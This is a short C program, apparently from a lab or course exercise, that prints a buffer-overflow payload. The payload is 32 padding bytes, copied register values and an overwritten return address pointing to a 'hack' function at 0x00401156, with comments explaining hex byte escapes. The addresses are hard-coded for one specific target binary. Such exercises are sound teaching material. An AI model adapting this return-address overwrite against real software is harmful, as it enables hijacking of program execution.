#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

/**
 * The exploit string that will be written to stdout
 * 
 * \x is the escape character that makes gcc interpret the coming 
 * characters as hexadecimal values (not as ASCII characters). The sequence of 
 * bytes in "exploit" will exactly match the bytes you denote in hex (and thus binary).
 * 
 * 1 byte is represented with 2 hex numbers
 * 1 byte --> 8 bits --> [0 - 255] : [0000 0000 - 1111 1111] : [00 - FF]
 * 
 * https://www.w3resource.com/convert/number/hex-to-binary.php
 * 
 * So if we wanted to write 2 bytes of all 1s we would write 
 * 
 * "\xFF\xFF" --> 1111 1111 1111 1111
 * 
 */
// Buffer exploit value for overflow 1
// const char exploit[] = "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
//                        "\x83";  // 0x83 is 131 in hexadecimal

// Buffer exploit value for overflow 2
const char exploit[] = \
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" // 32 'A'-s
"\x00\x8f\xfb\xf7\xff\x7f\x00\x00\xf0\x11\x40\x00\x0c\x00\x00\x00\xe0\xe4\xff\xff\xff\x7f\x00\x00\x56\x11\x40\x00" // Copy of register values from the end of buffer up to $rip. $rip value is changed to 0x00401156 - address of first instruction of hack function
;

/** 
 * Write the exploit bytes to stdout
 */
int main(int argc, char** argv)
{

    // strings are null terminated so we write the sizeof the exploit string minus 1 
    // to only write out the bytes specified 
    write(STDOUT_FILENO,exploit,sizeof(exploit) -1);

    // free(e);
    return 0; 

    
}
